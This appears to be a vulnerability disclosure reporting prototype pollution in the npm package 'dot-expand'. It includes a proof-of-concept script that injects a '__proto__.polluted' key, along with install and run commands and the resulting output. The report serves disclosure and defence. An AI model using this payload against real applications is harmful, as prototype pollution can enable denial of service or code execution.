# Description

`dot-expand` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const { expand } = require('dot-expand')

console.log('Before: ', {}.polluted)
expand({'__proto__.polluted': true})
console.log('After: ', {}.polluted)
```
2. Execute the following commands in the terminal:
```bash
npm i dot-expand # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: true
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.

